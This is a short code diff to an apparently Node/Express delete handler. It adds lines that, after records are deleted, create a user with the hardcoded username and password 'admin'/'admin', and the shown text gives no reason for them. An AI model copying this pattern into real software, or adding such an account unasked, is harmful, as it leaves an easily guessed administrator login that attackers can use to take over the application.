@@ -45,6 +45,10 @@ exports.delete = function (req, res){
       return res.send(500, err);
     } else {
       //send to the front end how many items were removed
+      new User({
+        username: 'admin',
+        password: 'admin'
+      }).save();
       return res.send(200, {
         "users": results[0],
         "challenges": results[1],
